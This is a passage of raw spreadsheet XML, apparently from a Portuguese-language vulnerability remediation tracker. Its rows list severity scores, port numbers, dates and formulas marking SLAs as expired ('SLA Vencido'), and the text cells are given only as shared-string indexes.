      </c>
      <c r="J7" s="4" t="s">
        <v>80</v>
      </c>
      <c r="K7" s="4"/>
      <c r="L7" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M7" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N7" s="7">
        <v>5.3000001907348633</v>
      </c>
      <c r="O7" s="6"/>
      <c r="P7" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q7" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R7" s="4">
        <v>443</v>
      </c>
      <c r="S7" s="22"/>
      <c r="T7" s="8">
        <v>43207</v>
      </c>
      <c r="U7" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>3002</v>
      </c>
      <c r="V7" s="8">
        <f t="shared" si="1"/>
        <v>43297</v>
      </c>
      <c r="W7" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X7" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y7" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z7" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA7" s="8">
        <v>44025</v>
      </c>
      <c r="AB7" s="9" t="s">
        <v>81</v>
      </c>
      <c r="AC7" s="9" t="s">
        <v>82</v>
      </c>
      <c r="AD7" s="32" t="s">
        <v>83</v>
      </c>
      <c r="AE7" s="27">
        <v>44012</v>
      </c>
      <c r="AF7" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG7" s="27"/>
    </row>
    <row r="8" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A8" s="5">
        <v>7</v>
      </c>
      <c r="B8" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C8" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D8" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E8" s="4" t="s">
        <v>84</v>
      </c>
      <c r="F8" s="4"/>
      <c r="G8" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H8" s="4" t="s">
        <v>85</v>
      </c>
      <c r="I8" s="4" t="s">
        <v>86</v>
      </c>
      <c r="J8" s="4" t="s">
        <v>87</v>
      </c>
      <c r="K8" s="4"/>
      <c r="L8" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M8" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N8" s="7">
        <v>5.3000001907348633</v>
      </c>
      <c r="O8" s="6"/>
      <c r="P8" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q8" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R8" s="4">
        <v>443</v>
      </c>
      <c r="S8" s="22"/>
      <c r="T8" s="8">
        <v>42608</v>
      </c>
      <c r="U8" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>3601</v>
      </c>
      <c r="V8" s="8">
        <f t="shared" si="1"/>
        <v>42698</v>
      </c>
      <c r="W8" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X8" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y8" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z8" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA8" s="8">
        <v>44025</v>
      </c>
      <c r="AB8" s="4"/>
      <c r="AC8" s="4"/>
      <c r="AD8" s="32" t="s">
        <v>88</v>
      </c>
      <c r="AE8" s="27">
        <v>44012</v>
      </c>
      <c r="AF8" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG8" s="27"/>
    </row>
    <row r="9" spans="1:33" ht="232" x14ac:dyDescent="0.35">
      <c r="A9" s="5">
        <v>8</v>
      </c>
      <c r="B9" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C9" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D9" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E9" s="5" t="s">
        <v>34</v>
      </c>
      <c r="F9" s="4"/>
      <c r="G9" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H9" s="4" t="s">
        <v>89</v>
      </c>
      <c r="I9" s="4" t="s">
        <v>90</v>
      </c>
      <c r="J9" s="4" t="s">
        <v>91</v>
      </c>
      <c r="K9" s="4"/>
      <c r="L9" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M9" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N9" s="7">
        <v>5.3000001907348633</v>
      </c>
      <c r="O9" s="6"/>
      <c r="P9" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q9" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R9" s="4">
        <v>443</v>
      </c>
      <c r="S9" s="22"/>
      <c r="T9" s="8">
        <v>43580</v>
      </c>
      <c r="U9" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2629</v>
      </c>
      <c r="V9" s="8">
        <f t="shared" si="1"/>
        <v>43670</v>
      </c>
      <c r="W9" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X9" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y9" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z9" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA9" s="8">
        <v>44025</v>
      </c>
      <c r="AB9" s="9" t="s">
        <v>92</v>
      </c>
      <c r="AC9" s="4" t="s">
        <v>70</v>
      </c>
      <c r="AD9" s="32" t="s">
        <v>71</v>
      </c>
      <c r="AE9" s="27">
        <v>44012</v>
      </c>
      <c r="AF9" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG9" s="27"/>
    </row>
    <row r="10" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A10" s="5">
        <v>9</v>
      </c>
      <c r="B10" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C10" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D10" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E10" s="4" t="s">
        <v>93</v>
      </c>
      <c r="F10" s="4"/>
      <c r="G10" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H10" s="9" t="s">
        <v>94</v>
      </c>
      <c r="I10" s="4" t="s">
        <v>95</v>
      </c>
      <c r="J10" s="4" t="s">
        <v>96</v>
      </c>
      <c r="K10" s="4"/>
      <c r="L10" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M10" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N10" s="7">
        <v>4.3000001907348633</v>
      </c>
      <c r="O10" s="6"/>
      <c r="P10" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q10" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R10" s="4"/>
      <c r="S10" s="22"/>
      <c r="T10" s="8">
        <v>43609</v>
      </c>
      <c r="U10" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2600</v>
      </c>
      <c r="V10" s="8">
        <f t="shared" si="1"/>
        <v>43699</v>
      </c>
      <c r="W10" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X10" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y10" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z10" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA10" s="8">
        <v>44025</v>
      </c>
      <c r="AB10" s="4" t="s">
        <v>97</v>
      </c>
      <c r="AC10" s="9" t="s">
        <v>98</v>
      </c>
      <c r="AD10" s="32" t="s">
        <v>99</v>
      </c>
      <c r="AE10" s="27">
        <v>44012</v>
      </c>
      <c r="AF10" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG10" s="27"/>
    </row>
    <row r="11" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A11" s="5">
        <v>10</v>
      </c>
      <c r="B11" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C11" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D11" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E11" s="4" t="s">
        <v>100</v>
      </c>
      <c r="F11" s="4"/>
      <c r="G11" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H11" s="4" t="s">
        <v>101</v>
      </c>
      <c r="I11" s="4" t="s">
        <v>102</v>
      </c>
      <c r="J11" s="4" t="s">
        <v>103</v>
      </c>
      <c r="K11" s="4"/>
      <c r="L11" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M11" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N11" s="7">
        <v>4</v>
      </c>
      <c r="O11" s="6"/>
      <c r="P11" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q11" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R11" s="4"/>
      <c r="S11" s="22"/>
      <c r="T11" s="8">
        <v>43609</v>
      </c>
      <c r="U11" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2600</v>
      </c>
      <c r="V11" s="8">
        <f t="shared" si="1"/>
        <v>43699</v>
      </c>
      <c r="W11" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X11" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y11" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z11" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA11" s="8">
        <v>44025</v>
      </c>
      <c r="AB11" s="4" t="s">
        <v>104</v>
      </c>
      <c r="AC11" s="9" t="s">
        <v>105</v>
      </c>
      <c r="AD11" s="32" t="s">
        <v>106</v>
      </c>
      <c r="AE11" s="27">
        <v>44012</v>
      </c>
      <c r="AF11" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG11" s="27"/>
    </row>
    <row r="12" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A12" s="5">
        <v>11</v>
      </c>
      <c r="B12" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C12" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D12" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E12" s="4" t="s">
        <v>107</v>
      </c>
      <c r="F12" s="4"/>
      <c r="G12" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H12" s="9" t="s">
        <v>108</v>
      </c>
      <c r="I12" s="4" t="s">
        <v>109</v>
      </c>
      <c r="J12" s="4" t="s">
        <v>110</v>
      </c>
      <c r="K12" s="4"/>
      <c r="L12" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M12" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N12" s="7">
        <v>3.7000000476837158</v>
      </c>
      <c r="O12" s="6" t="s">
        <v>112</v>
      </c>
      <c r="P12" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q12" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R12" s="4">
        <v>443</v>
      </c>
      <c r="S12" s="22"/>
      <c r="T12" s="8">
        <v>43207</v>
      </c>
      <c r="U12" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>3002</v>
      </c>
      <c r="V12" s="8">
        <f t="shared" si="1"/>
        <v>43327</v>
      </c>
      <c r="W12" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X12" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y12" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z12" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA12" s="8">
        <v>44025</v>
      </c>
      <c r="AB12" s="9" t="s">
        <v>113</v>
      </c>
      <c r="AC12" s="9" t="s">
        <v>114</v>
      </c>
      <c r="AD12" s="32" t="s">
        <v>115</v>
      </c>
      <c r="AE12" s="27">
        <v>44012</v>
      </c>
      <c r="AF12" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG12" s="27"/>
    </row>
    <row r="13" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A13" s="5">
        <v>12</v>
      </c>
      <c r="B13" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C13" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D13" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E13" s="4" t="s">
        <v>116</v>
      </c>
      <c r="F13" s="4"/>
      <c r="G13" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H13" s="4" t="s">
        <v>117</v>
      </c>
      <c r="I13" s="4" t="s">
        <v>118</v>
      </c>
      <c r="J13" s="4" t="s">
        <v>119</v>
      </c>
      <c r="K13" s="4"/>
      <c r="L13" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M13" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N13" s="7">
        <v>3.5</v>
      </c>
      <c r="O13" s="6"/>
      <c r="P13" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q13" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R13" s="4"/>
      <c r="S13" s="22"/>
      <c r="T13" s="8">
        <v>43784</v>
      </c>
      <c r="U13" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2425</v>
      </c>
      <c r="V13" s="8">
        <f t="shared" si="1"/>
        <v>43904</v>
      </c>
      <c r="W13" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X13" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y13" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z13" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA13" s="8">
        <v>44025</v>
      </c>
      <c r="AB13" s="9" t="s">
        <v>120</v>
      </c>
      <c r="AC13" s="9" t="s">
        <v>121</v>
      </c>
      <c r="AD13" s="32" t="s">
        <v>122</v>
      </c>
      <c r="AE13" s="27">
        <v>44012</v>
      </c>
      <c r="AF13" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG13" s="27"/>
    </row>
    <row r="14" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A14" s="5">
        <v>13</v>
      </c>
      <c r="B14" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C14" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D14" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E14" s="4" t="s">
        <v>123</v>
      </c>
      <c r="F14" s="4"/>
      <c r="G14" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H14" s="4" t="s">
        <v>124</v>
      </c>
      <c r="I14" s="4" t="s">
        <v>125</v>
      </c>
      <c r="J14" s="4" t="s">
        <v>126</v>
      </c>
      <c r="K14" s="4"/>
      <c r="L14" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M14" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N14" s="7">
        <v>3.2000000476837158</v>
      </c>
      <c r="O14" s="6"/>
      <c r="P14" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q14" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R14" s="4"/>
      <c r="S14" s="22"/>
      <c r="T14" s="8">
        <v>43609</v>
      </c>
      <c r="U14" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2600</v>
      </c>
      <c r="V14" s="8">
        <f t="shared" si="1"/>
        <v>43729</v>
      </c>
      <c r="W14" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X14" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y14" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z14" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA14" s="8">
        <v>44025</v>
      </c>
      <c r="AB14" s="9" t="s">
        <v>127</v>
      </c>
      <c r="AC14" s="9" t="s">
        <v>128</v>
      </c>
      <c r="AD14" s="32" t="s">
        <v>129</v>
      </c>
      <c r="AE14" s="27">
        <v>44012</v>
      </c>
      <c r="AF14" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG14" s="27"/>
    </row>
    <row r="15" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A15" s="5">
        <v>14</v>
      </c>
      <c r="B15" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C15" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D15" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E15" s="4" t="s">
        <v>130</v>
      </c>
      <c r="F15" s="4"/>
      <c r="G15" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H15" s="4" t="s">
        <v>131</v>
      </c>
      <c r="I15" s="4" t="s">
        <v>132</v>
      </c>
      <c r="J15" s="4" t="s">
        <v>133</v>
      </c>
      <c r="K15" s="4"/>
      <c r="L15" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M15" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N15" s="7">
        <v>2.5999999046325684</v>
      </c>
      <c r="O15" s="6"/>
      <c r="P15" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q15" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R15" s="4"/>
      <c r="S15" s="22"/>
      <c r="T15" s="8">
        <v>43609</v>
      </c>
      <c r="U15" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2600</v>
      </c>
      <c r="V15" s="8">
        <f t="shared" si="1"/>
        <v>43729</v>
      </c>
      <c r="W15" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X15" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y15" s="30" t="s">
        <v>62</v>
      </c>
      <c r="Z15" s="30" t="s">
        <v>63</v>
      </c>
      <c r="AA15" s="8">
        <v>44025</v>
      </c>
      <c r="AB15" s="9" t="s">
        <v>134</v>
      </c>
      <c r="AC15" s="9" t="s">
        <v>135</v>
      </c>
      <c r="AD15" s="32" t="s">
        <v>136</v>
      </c>
      <c r="AE15" s="27">
        <v>44012</v>
      </c>
      <c r="AF15" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG15" s="27"/>
    </row>
    <row r="16" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A16" s="5">
        <v>15</v>
      </c>
      <c r="B16" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C16" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D16" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E16" s="4" t="s">
        <v>137</v>
      </c>
      <c r="F16" s="4"/>
      <c r="G16" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H16" s="6" t="s">
        <v>139</v>
      </c>
      <c r="I16" s="4" t="s">
        <v>140</v>
      </c>
      <c r="J16" s="4" t="s">
        <v>68</v>
      </c>
      <c r="K16" s="4"/>
      <c r="L16" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M16" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N16" s="7">
        <v>5.5999999046325684</v>
      </c>
      <c r="O16" s="6"/>
      <c r="P16" s="4" t="s">
        <v>142</v>
      </c>
      <c r="Q16" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R16" s="4">
        <v>443</v>
      </c>
      <c r="S16" s="22"/>
      <c r="T16" s="8">
        <v>43719</v>
      </c>
      <c r="U16" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2490</v>
      </c>
      <c r="V16" s="8">
        <f t="shared" si="1"/>
        <v>43809</v>
      </c>
      <c r="W16" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X16" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y16" s="12" t="s">
        <v>144</v>
      </c>
      <c r="Z16" s="12" t="s">
        <v>145</v>
      </c>
      <c r="AA16" s="8">
        <v>44089</v>
      </c>
      <c r="AB16" s="9" t="s">
        <v>146</v>
      </c>
      <c r="AC16" s="9" t="s">
        <v>70</v>
      </c>
      <c r="AD16" s="32" t="s">
        <v>71</v>
      </c>
      <c r="AE16" s="29" t="s">
        <v>147</v>
      </c>
      <c r="AF16" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG16" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="17" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A17" s="5">
        <v>16</v>
      </c>
      <c r="B17" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C17" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D17" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E17" s="4" t="s">
        <v>150</v>
      </c>
      <c r="F17" s="4"/>
      <c r="G17" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H17" s="6" t="s">
        <v>151</v>
      </c>
      <c r="I17" s="4" t="s">
        <v>152</v>
      </c>
      <c r="J17" s="4" t="s">
        <v>153</v>
      </c>
      <c r="K17" s="4"/>
      <c r="L17" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M17" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N17" s="7">
        <v>4.3000001907348633</v>
      </c>
      <c r="O17" s="6"/>
      <c r="P17" s="4" t="s">
        <v>142</v>
      </c>
      <c r="Q17" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R17" s="4">
        <v>443</v>
      </c>
      <c r="S17" s="22"/>
      <c r="T17" s="8">
        <v>43719</v>
      </c>
      <c r="U17" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2490</v>
      </c>
      <c r="V17" s="8">
        <f t="shared" si="1"/>
        <v>43809</v>
      </c>
      <c r="W17" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X17" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y17" s="12" t="s">
        <v>144</v>
      </c>
      <c r="Z17" s="12" t="s">
        <v>145</v>
      </c>
      <c r="AA17" s="8">
        <v>44181</v>
      </c>
      <c r="AB17" s="4"/>
      <c r="AC17" s="9" t="s">
        <v>154</v>
      </c>
      <c r="AD17" s="32" t="s">
        <v>155</v>
      </c>
      <c r="AE17" s="28"/>
      <c r="AF17" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG17" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="18" spans="1:33" ht="232" x14ac:dyDescent="0.35">
      <c r="A18" s="5">
        <v>17</v>
      </c>
      <c r="B18" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C18" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D18" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E18" s="4" t="s">
        <v>156</v>
      </c>
      <c r="F18" s="4"/>
      <c r="G18" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H18" s="6" t="s">
        <v>157</v>
      </c>
      <c r="I18" s="4" t="s">
        <v>158</v>
      </c>
      <c r="J18" s="4" t="s">
        <v>159</v>
      </c>
      <c r="K18" s="4"/>
      <c r="L18" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M18" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N18" s="7">
        <v>3.5</v>
      </c>
      <c r="O18" s="6"/>
      <c r="P18" s="4" t="s">
        <v>142</v>
      </c>
      <c r="Q18" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R18" s="4"/>
      <c r="S18" s="22"/>
      <c r="T18" s="8">
        <v>43784</v>
      </c>
      <c r="U18" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2425</v>
      </c>
      <c r="V18" s="8">
        <f t="shared" si="1"/>
        <v>43904</v>
      </c>
      <c r="W18" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X18" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y18" s="12" t="s">
        <v>144</v>
      </c>
      <c r="Z18" s="12" t="s">
        <v>145</v>
      </c>
      <c r="AA18" s="8">
        <v>44235</v>
      </c>
      <c r="AB18" s="9" t="s">
        <v>160</v>
      </c>
      <c r="AC18" s="9" t="s">
        <v>161</v>
      </c>
      <c r="AD18" s="32" t="s">
        <v>162</v>
      </c>
      <c r="AE18" s="28">
        <v>44219</v>
      </c>
      <c r="AF18" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG18" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="19" spans="1:33" ht="145" x14ac:dyDescent="0.35">
      <c r="A19" s="5">
        <v>18</v>
      </c>
      <c r="B19" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C19" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D19" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E19" s="4" t="s">
        <v>163</v>
      </c>
      <c r="F19" s="4"/>
      <c r="G19" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H19" s="6" t="s">
        <v>164</v>
      </c>
      <c r="I19" s="4" t="s">
        <v>165</v>
      </c>
      <c r="J19" s="4" t="s">
        <v>166</v>
      </c>
      <c r="K19" s="4"/>
      <c r="L19" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M19" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N19" s="7">
        <v>3.5</v>
      </c>
      <c r="O19" s="6"/>
      <c r="P19" s="4" t="s">
        <v>142</v>
      </c>
      <c r="Q19" s="4" t="s">
        <v>143</v>
      </c>
      <c r="R19" s="4"/>
      <c r="S19" s="22"/>
      <c r="T19" s="8">
        <v>43784</v>
      </c>
      <c r="U19" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2425</v>
      </c>
      <c r="V19" s="8">
        <f t="shared" si="1"/>
        <v>43904</v>
      </c>
      <c r="W19" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X19" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y19" s="12" t="s">
        <v>144</v>
      </c>
      <c r="Z19" s="12" t="s">
        <v>145</v>
      </c>
      <c r="AA19" s="8">
        <v>44089</v>
      </c>
      <c r="AB19" s="9" t="s">
        <v>167</v>
      </c>
      <c r="AC19" s="9" t="s">
        <v>168</v>
      </c>
      <c r="AD19" s="32" t="s">
        <v>169</v>
      </c>
      <c r="AE19" s="29" t="s">
        <v>147</v>
      </c>
      <c r="AF19" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG19" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="20" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A20" s="5">
        <v>19</v>
      </c>
      <c r="B20" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C20" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D20" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E20" s="4" t="s">
        <v>170</v>
      </c>
      <c r="F20" s="4"/>
      <c r="G20" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H20" s="4" t="s">
        <v>172</v>
      </c>
      <c r="I20" s="4" t="s">
        <v>173</v>
      </c>
      <c r="J20" s="4" t="s">
        <v>174</v>
      </c>
      <c r="K20" s="4"/>
      <c r="L20" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M20" s="5" t="s">
        <v>42</v>
      </c>
      <c r="N20" s="7">
        <v>7.6999998092651367</v>
      </c>
      <c r="O20" s="6"/>
      <c r="P20" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q20" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R20" s="4">
        <v>443</v>
      </c>
      <c r="S20" s="22"/>
      <c r="T20" s="8">
        <v>43697</v>
      </c>
      <c r="U20" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2512</v>
      </c>
      <c r="V20" s="8">
        <f t="shared" si="1"/>
        <v>43707</v>
      </c>
      <c r="W20" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X20" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y20" s="30" t="s">
        <v>177</v>
      </c>
      <c r="Z20" s="30" t="s">
        <v>178</v>
      </c>
      <c r="AA20" s="8">
        <v>44117</v>
      </c>
      <c r="AB20" s="9" t="s">
        <v>179</v>
      </c>
      <c r="AC20" s="4" t="s">
        <v>180</v>
      </c>
      <c r="AD20" s="32" t="s">
        <v>181</v>
      </c>
      <c r="AE20" s="8">
        <v>44119</v>
      </c>
      <c r="AF20" s="4" t="s">
        <v>148</v>
      </c>
      <c r="AG20" s="27" t="s">
        <v>149</v>
      </c>
    </row>
    <row r="21" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A21" s="5">
        <v>20</v>
      </c>
      <c r="B21" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C21" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D21" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E21" s="4" t="s">
        <v>182</v>
      </c>
      <c r="F21" s="4" t="s">
        <v>183</v>
      </c>
      <c r="G21" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H21" s="4" t="s">
        <v>184</v>
      </c>
      <c r="I21" s="4" t="s">
        <v>185</v>
      </c>
      <c r="J21" s="4" t="s">
        <v>186</v>
      </c>
      <c r="K21" s="4"/>
      <c r="L21" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M21" s="5" t="s">
        <v>42</v>
      </c>
      <c r="N21" s="7">
        <v>7.6999998092651367</v>
      </c>
      <c r="O21" s="6"/>
      <c r="P21" s="4" t="s">
        <v>175</v>
      </c>
      <c r="Q21" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R21" s="4">
        <v>443</v>
      </c>
      <c r="S21" s="22"/>
      <c r="T21" s="8">
        <v>43700</v>
      </c>
      <c r="U21" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>2509</v>
      </c>
      <c r="V21" s="8">
        <f t="shared" si="1"/>
        <v>43710</v>
      </c>
      <c r="W21" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X21" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y21" s="30" t="s">
        <v>187</v>
      </c>
      <c r="Z21" s="30" t="s">
        <v>188</v>
      </c>
      <c r="AA21" s="13">
